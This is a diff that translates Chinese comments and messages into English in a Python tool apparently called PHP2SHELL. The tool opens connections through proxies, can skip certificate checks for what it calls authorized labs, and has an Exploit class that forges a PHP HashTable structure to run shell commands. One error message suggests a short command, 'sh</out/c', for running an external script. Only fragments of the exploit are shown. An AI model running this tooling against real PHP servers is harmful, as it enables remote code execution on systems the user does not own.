@@ -68,23 +68,23 @@ def read_offsets_file(path: str) -> dict[str, int]:
     return vals
 
 
-# ---- 全局请求层默认值（由 CLI 注入）----
-DEFAULT_PROXY = None      # 形如 http://127.0.0.1:8080 或 socks5://u:p@127.0.0.1:1080
-# 访问 IP 但目标 vhost 只认域名时，用它覆盖 Host 头（公网靶场常见）
+# ---- Global request-layer defaults (injected by the CLI) ----
+DEFAULT_PROXY = None      # e.g. http://127.0.0.1:8080 or socks5://u:p@127.0.0.1:1080
+# When accessing by IP but the target vhost only accepts a domain, use this to override the Host header (common with public labs)
 DEFAULT_HOST_HEADER = None
-# True = 访问 https 目标时跳过证书校验（自签/过期证书靶场）
-# 支持环境变量兜底，便于 p2s_ext 派生子进程时透传 --insecure
+# True = skip certificate verification when accessing https targets (self-signed/expired-cert labs)
+# Environment-variable fallback is supported so p2s_ext can pass --insecure through to child processes
 DEFAULT_INSECURE = os.environ.get("PHP2SHELL_INSECURE", "") == "1"
-DEFAULT_HEADERS = {}      # 追加到每个请求的头部，如 {"User-Agent": "my-research-scanner"}
-DEFAULT_SOURCES = []      # 本地源地址池（仅能是本机网卡/回环上已配置的地址）
+DEFAULT_HEADERS = {}      # headers appended to every request, e.g. {"User-Agent": "my-research-scanner"}
+DEFAULT_SOURCES = []      # local source address pool (only addresses configured on local NICs/loopback)
 _SRC_IDX = [0]
 
 
 def _create_conn(host: str, port: int, timeout: float, src=None):
-    """建立 TCP 连接；src 非空时绑定本地源地址。
+    """Open a TCP connection; when src is non-empty, bind to the local source address.
 
-    注意：bind() 只对**本机已配置**的地址成功（否则 EADDRNOTAVAIL），
-    因此该能力天然限制在「你自己拥有的源地址」，无法用于匿名化第三方攻击。
+    Note: bind() only succeeds for addresses **configured on this machine** (otherwise EADDRNOTAVAIL),
+    so this capability is inherently limited to "source addresses you own" and cannot be used to anonymize third-party attacks.
     """
     if not src:
         return socket.create_connection((host, port), timeout=timeout)
@@ -102,7 +102,7 @@ def _create_conn(host: str, port: int, timeout: float, src=None):
 
 
 def _socks5_handshake(s, host: str, port: int, user=None, pwd=None) -> None:
-    """最小 SOCKS5 CONNECT 实现（无认证 / 用户名密码认证）。"""
+    """Minimal SOCKS5 CONNECT implementation (no auth / username-password auth)."""
     s.sendall(b"\x05\x02\x00\x02" if user else b"\x05\x01\x00")
     r = s.recv(2)
     if len(r) < 2 or r[0] != 5:
@@ -154,7 +154,7 @@ class Target:
             print(msg, flush=True)
 
     def _open_socket(self, tmo: float):
-        """直连，或经单个 HTTP/SOCKS5 代理建立到目标的连接（用于企业出网/调试）。"""
+        """Connect directly, or through a single HTTP/SOCKS5 proxy to the target (for corporate egress/debugging)."""
         src = None
         if DEFAULT_SOURCES:
             src = DEFAULT_SOURCES[_SRC_IDX[0] % len(DEFAULT_SOURCES)]
@@ -202,7 +202,7 @@ class Target:
                 if self.https:
                     ctx = ssl.create_default_context()
                     if DEFAULT_INSECURE:
-                        # 自签/过期证书的授权靶场：跳过校验（默认关闭）
+                        # Authorized lab with a self-signed/expired certificate: skip verification (off by default)
                         ctx.check_hostname = False
                         ctx.verify_mode = ssl.CERT_NONE
                     s = ctx.wrap_socket(s, server_hostname=self.host)
@@ -451,9 +451,9 @@ class Exploit:
         cap = ht_size - 0x98 - 1
         if len(cmd) > cap:
             raise ValueError(
-                f"命令 {len(cmd)} 字节，超过伪造结构容量 {cap} 字节"
-                f"（ht_size={ht_size}，容量 = ht_size - 0x98 - 1）；"
-                f"可改用 'sh</out/c' 之类短命令执行外部脚本"
+                f"command is {len(cmd)} bytes, exceeding the fake struct capacity of {cap} bytes"
+                f" (ht_size={ht_size}, capacity = ht_size - 0x98 - 1);"
+                f" use a short command such as 'sh</out/c' to run an external script"
             )
         ht = bytearray(b"\x00" * ht_size)
         # fake HashTable
